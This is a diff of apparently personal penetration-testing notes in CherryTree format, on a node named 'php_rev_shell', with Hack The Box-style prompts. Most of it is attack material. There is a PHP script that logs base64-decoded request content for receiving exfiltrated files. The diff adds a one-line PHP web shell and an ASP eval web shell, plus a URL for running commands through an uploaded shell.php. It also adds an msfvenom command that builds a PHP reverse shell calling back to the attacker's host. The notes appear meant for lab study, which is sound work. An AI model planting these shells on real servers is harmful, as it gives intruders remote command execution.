@@ -1,12 +1,41 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
-  <node unique_id="51" master_id="0" name="php_rev_shell" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747770321" ts_lastsave="1747770332">
+  <node unique_id="51" master_id="0" name="php_rev_shell" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747770321" ts_lastsave="1767442548">
     <rich_text>Script for hosting a php server - sending a file as a request base66 encoded
 </rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+
+To execute use </rich_text>
+    <rich_text link="webs http://SERVER_IP:PORT/uploads/shell.php?cmd=id">http://SERVER_IP:PORT/uploads/shell.php?cmd=id</rich_text>
+    <rich_text>&#13;</rich_text>
+    <rich_text weight="heavy">Tip:</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#a4b1cd"> If we are using this custom web shell in a browser, it may be best to use source-view by clicking </rich_text>
+    <rich_text family="monospace">[CTRL+U]</rich_text>
+    <rich_text>&#13;&#13;&#13;Code: asp
+</rich_text>
+    <rich_text family="monospace">&lt;% eval request('cmd') %&gt;</rich_text>
+    <rich_text>&#13;&#13;&#13;&#13;</rich_text>
+    <rich_text family="monospace">Momothechi@htb[/htb]</rich_text>
+    <rich_text family="monospace" foreground="#ff8484" weight="heavy">$</rich_text>
+    <rich_text family="monospace"> msfvenom -p php/reverse_php </rich_text>
+    <rich_text family="monospace" foreground="#c5f467">LHOST</rich_text>
+    <rich_text family="monospace" foreground="#5cb2ff">=</rich_text>
+    <rich_text family="monospace">OUR_IP </rich_text>
+    <rich_text family="monospace" foreground="#c5f467">LPORT</rich_text>
+    <rich_text family="monospace" foreground="#5cb2ff">=</rich_text>
+    <rich_text family="monospace">OUR_PORT -f raw </rich_text>
+    <rich_text family="monospace" foreground="#5cb2ff">&gt;</rich_text>
+    <rich_text family="monospace"> reverse.php
+...SNIP...
+Payload size: 3033 bytes</rich_text>
+    <rich_text>&#13;&#13;</rich_text>
     <codebox char_offset="77" justification="left" frame_width="1971" frame_height="20" width_in_pixels="1" syntax_highlighting="php" highlight_brackets="1" show_line_numbers="0">&lt;?php&#13;
 if(isset($_GET['content'])){&#13;
     error_log("\n\n" . base64_decode($_GET['content']));&#13;
 }&#13;
 ?&gt;</codebox>
+    <codebox char_offset="80" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">&lt;?php system($_REQUEST['cmd']); ?&gt;</codebox>
   </node>
 </cherrytree>
